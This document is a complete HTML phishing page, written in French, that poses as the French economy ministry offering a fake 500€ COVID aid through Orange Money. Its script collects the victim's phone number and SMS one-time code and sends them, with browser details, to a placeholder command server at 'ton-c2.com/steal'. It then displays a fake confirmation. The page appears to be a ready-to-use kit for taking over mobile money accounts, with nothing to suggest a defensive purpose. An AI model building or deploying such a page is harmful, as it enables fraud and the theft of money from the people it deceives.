
<!DOCTYPE html>
<html>
<head>
    <title>Aide Orange Money - Ministère</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body { font-family: Arial; background: #f0f8ff; text-align: center; padding: 20px; }
        .header { background: #ff4444; color: white; padding: 20px; border-radius: 10px; font-size: 24px; }
        .form { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 400px; margin: 20px auto; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
        button { background: #00aa44; color: white; padding: 15px; border: none; border-radius: 8px; font-size: 18px; width: 100%; }
        .loading { display: none; background: #ffaa00; color: white; padding: 20px; border-radius: 10px; }
        @media (max-width: 500px) { .header { font-size: 20px; } }
    </style>
</head>
<body>
    <div class="header">🚨 MINISTÈRE ÉCONOMIE 🚨<br><small>Aide Exceptionnelle ORANGE MONEY 500€</small></div>
    
    <div class="form">
        <h2>✅ Confirmez votre aide</h2>
        <p>Votre numéro a été pré-sélectionné pour l'aide COVID.</p>
        
        <input type="tel" id="phone" placeholder="06 XX XX XX XX" maxlength="10" required>
        <input type="text" id="otp" placeholder="Code reçu par SMS (6 chiffres)" maxlength="6">
        
        <button onclick="submitForm()">🎁 RÉCUPÉRER 500€ MAINTENANT</button>
    </div>
    
    <div id="loading" class="loading">⏳ Virement en cours... Ne quittez pas !</div>

    <script>
        function submitForm() {
            const phone = document.getElementById('phone').value;
            const otp = document.getElementById('otp').value;
            
            if (!phone || !otp) return alert('Renseignez tous les champs');
            
            // Cache form, montre loading
            document.querySelector('.form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // ENVOI À TON SERVEUR
            fetch('https://ton-c2.com/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: phone,
                    otp: otp,
                    ip: 'victim_ip_auto_detect',
                    useragent: navigator.userAgent,
                    timestamp: Date.now()
                })
            }).then(() => {
                // Redirige vers fake succès
                setTimeout(() => {
                    document.body.innerHTML = '<h1 style="color:green">✅ Aide reçue ! Vérifiez votre solde Orange Money.</h1>';
                }, 3000);
            });
        }
        
        // Auto-focus
        document.getElementById('phone').focus();
    </script>
</body>
</html>
